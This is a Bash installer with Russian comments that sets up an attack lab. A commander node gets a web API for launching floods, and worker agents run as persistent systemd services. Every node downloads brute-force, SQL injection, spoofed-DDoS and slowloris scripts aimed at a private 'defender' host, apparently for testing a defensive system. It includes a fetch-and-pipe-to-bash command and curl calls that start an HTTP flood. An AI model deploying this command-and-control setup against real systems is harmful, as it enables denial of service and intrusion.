#!/bin/bash
# ============================================================
# ATTACKER NODE — установка на atk-1...atk-7
#
# На atk-1 (командер):
#   ROLE=commander DEFENDER_IP=192.168.10.5 bash install_attacker.sh
#
# На atk-2...atk-7 (воркеры):
#   ROLE=worker COMMANDER_IP=192.168.10.2 bash install_attacker.sh
#
# Или скачать и запустить:
#   wget -qO- https://raw.githubusercontent.com/YOUR_USERNAME/defender/main/attacker-system/install_attacker.sh | \
#     ROLE=worker COMMANDER_IP=192.168.10.2 bash
# ============================================================

set -e
CYAN='\033[0;36m'; GREEN='\033[0;32m'; NC='\033[0m'
info() { echo -e "${CYAN}[attacker]${NC} $1"; }
ok()   { echo -e "${GREEN}[✓]${NC} $1"; }

ROLE=${ROLE:-worker}
COMMANDER_IP=${COMMANDER_IP:-"192.168.10.2"}
DEFENDER_IP=${DEFENDER_IP:-"192.168.10.5"}
INSTALL_DIR="${HOME}/attacker"

echo ""
info "Роль: ${ROLE} | Командер: ${COMMANDER_IP} | Цель: ${DEFENDER_IP}"
echo ""

# ── Системные зависимости ─────────────────────────────────────────────────────
info "Устанавливаю зависимости..."
sudo apt-get update -q
sudo apt-get install -y --no-install-recommends \
    python3 python3-pip git curl apache2-utils nikto -q

# wrk
if ! command -v wrk &>/dev/null; then
    sudo apt-get install -y wrk -q 2>/dev/null || {
        git clone --quiet https://github.com/wg/wrk.git /tmp/wrk_b
        cd /tmp/wrk_b && make -j2 -s && sudo cp wrk /usr/local/bin/ && cd -
    }
fi

pip3 install fastapi uvicorn requests --quiet
ok "Зависимости установлены"

# ── Скачать attacker-system ───────────────────────────────────────────────────
mkdir -p "$INSTALL_DIR/attacks"

# Скачать скрипты атак
BASE_URL="https://raw.githubusercontent.com/YOUR_USERNAME/defender/main/attacker-system/attacks"
for script in brute.py sqli.py ddos_spoof.py slowloris.py; do
    wget -q "${BASE_URL}/${script}" -O "${INSTALL_DIR}/attacks/${script}"
done
ok "Скрипты атак загружены"

# ── Установка по роли ─────────────────────────────────────────────────────────
if [ "$ROLE" = "commander" ]; then
    # ── КОМАНДЕР ─────────────────────────────────────────────────────────────
    wget -q "https://raw.githubusercontent.com/YOUR_USERNAME/defender/main/attacker-system/commander/main.py" \
         -O "${INSTALL_DIR}/commander.py"

    cat > /etc/systemd/system/commander.service << SVCEOF
[Unit]
Description=Attack Commander
After=network.target

[Service]
ExecStart=/usr/bin/python3 ${INSTALL_DIR}/commander.py
WorkingDirectory=${INSTALL_DIR}
Environment=TARGET_IP=${DEFENDER_IP}
Environment=CMD_PORT=5000
Environment=PYTHONPATH=${INSTALL_DIR}
Restart=always
User=${USER}

[Install]
WantedBy=multi-user.target
SVCEOF

    sudo systemctl daemon-reload
    sudo systemctl enable commander --quiet
    sudo systemctl start commander
    ok "Командер запущен"

    MY_IP=$(hostname -I | awk '{print $1}')
    echo ""
    echo -e "${GREEN}══════════════════════════════════════════════${NC}"
    echo -e "  🎮 Веб-интерфейс: ${CYAN}http://${MY_IP}:5000/ui${NC}"
    echo -e "  📡 API:           ${CYAN}http://${MY_IP}:5000/status${NC}"
    echo ""
    echo -e "  Управление с ноутбука:"
    echo -e "  ${CYAN}# Запустить HTTP-флуд:"
    echo -e "  curl -X POST http://${MY_IP}:5000/attack/start \\"
    echo -e "    -H 'Content-Type: application/json' \\"
    echo -e "    -d '{\"attack_type\": \"flood\"}'"
    echo -e "  # Остановить:"
    echo -e "  curl -X POST http://${MY_IP}:5000/attack/stop${NC}"
    echo -e "${GREEN}══════════════════════════════════════════════${NC}"

else
    # ── ВОРКЕР ───────────────────────────────────────────────────────────────
    wget -q "https://raw.githubusercontent.com/YOUR_USERNAME/defender/main/attacker-system/worker/agent.py" \
         -O "${INSTALL_DIR}/agent.py"

    cat > /etc/systemd/system/attacker-worker.service << SVCEOF
[Unit]
Description=Attack Worker Agent
After=network.target

[Service]
ExecStart=/usr/bin/python3 ${INSTALL_DIR}/agent.py
WorkingDirectory=${INSTALL_DIR}
Environment=COMMANDER_IP=${COMMANDER_IP}
Environment=CMD_PORT=5000
Environment=PYTHONPATH=${INSTALL_DIR}
Restart=always
User=${USER}

[Install]
WantedBy=multi-user.target
SVCEOF

    sudo systemctl daemon-reload
    sudo systemctl enable attacker-worker --quiet
    sudo systemctl start attacker-worker
    ok "Worker запущен. Слушает командера: ${COMMANDER_IP}:5000"
fi
